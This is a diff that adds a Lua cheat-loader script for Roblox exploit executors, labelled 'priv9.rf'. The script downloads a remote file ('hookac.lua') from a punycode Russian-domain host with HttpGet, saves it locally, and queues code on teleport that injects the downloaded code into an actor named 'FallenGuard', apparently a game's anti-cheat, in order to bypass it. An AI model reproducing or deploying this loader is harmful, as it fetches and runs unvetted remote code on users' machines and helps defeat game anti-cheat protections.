@@ -1,0 +1,20 @@
+local safeprint = function(...) print("[LOG] ", ...) end;
+local source_squared = [===[
+    local safeprint = function(...) print("[LOG] ", ...) end;
+    safeprint('priv9.rf > trying to bypass...')
+    
+    local source = readfile("priv9rf_spoofer.lua");
+    local players = game.GetService(game, "Players")
+    players.DescendantAdded:Connect(function(i)
+        if i.ClassName == "Actor" and i.Name == ("FallenGuard") then
+            run_on_actor(i, source)
+        end
+    end)
+]===];
+writefile("priv9rf_spoofer.lua", game:HttpGet("https://xn--9-ctbr1af.xn--p1ai/hookac.lua"));
+if (queue_on_teleport and hookfunction and getrenv and newcclosure) then
+    queue_on_teleport(source_squared);
+    safeprint("priv9.rf > enter server")
+else
+    game:GetService("Players").LocalPlayer:Kick("exploit not supported")
+end;
